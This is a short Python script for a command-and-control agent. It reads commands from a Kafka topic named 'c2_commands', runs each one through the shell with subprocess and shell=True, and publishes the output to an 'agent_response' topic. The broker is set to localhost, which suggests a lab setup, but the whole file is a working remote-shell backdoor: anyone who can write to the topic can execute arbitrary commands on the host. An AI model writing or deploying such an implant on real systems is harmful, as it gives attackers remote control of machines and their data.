import threading
from kafka import KafkaConsumer, KafkaProducer
import subprocess

KAFKA_BROKER = 'localhost:9092'
KAFKA_TOPIC_AS_PRODUCER = 'agent_response'
KAFKA_TOPIC_AS_CONSUMER = 'c2_commands'

consumer = KafkaConsumer(KAFKA_TOPIC_AS_CONSUMER, bootstrap_servers=KAFKA_BROKER)
producer = KafkaProducer(bootstrap_servers=KAFKA_BROKER)

def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip() if result.returncode == 0 else result.stderr.strip()

def send_output(output):
    producer.send(KAFKA_TOPIC_AS_PRODUCER, value=output.encode('utf-8'))
    # print(f"\n[Response Sent] {output} -> {KAFKA_TOPIC_AS_PRODUCER}\n")

def get_command():
    try:
        print("[Agent] Waiting for command...")
        for msg in consumer:
            command = msg.value.decode('utf-8')
            print(f"[Received Command] {command}")
            # print("[Executing] Processing the command...\n")
            output = execute_command(command)
            # print("[Execution Done]\n")
            print(f"[Command Output] {output}\n")
            send_output(output)
            print("\n[Agent] Waiting for next command...")
    except KeyboardInterrupt:
        print("\n[Agent] Interrupted by User. Shutting down...")

if __name__ == '__main__':
    consumer_thread = threading.Thread(target=get_command, daemon=True)
    consumer_thread.start()
    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\n[Agent] Interrupted by User. Shutting down...")
